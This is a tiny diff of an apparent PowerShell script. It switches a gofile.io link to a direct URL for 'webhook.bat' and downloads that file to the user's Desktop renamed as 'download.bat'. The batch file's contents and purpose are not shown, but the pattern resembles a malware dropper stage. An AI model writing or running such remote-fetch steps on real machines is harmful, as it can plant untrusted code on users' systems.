@@ -1,4 +1,4 @@
-$url = "https://gofile.io/d/CGqXuF"
+$url = "https://store10.gofile.io/download/web/dd4a8b1f-a0c5-4712-81e0-ede6258e16ff/webhook.bat"
 $desktop = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "download.bat")
 
 Invoke-WebRequest -Uri $url -OutFile $desktop
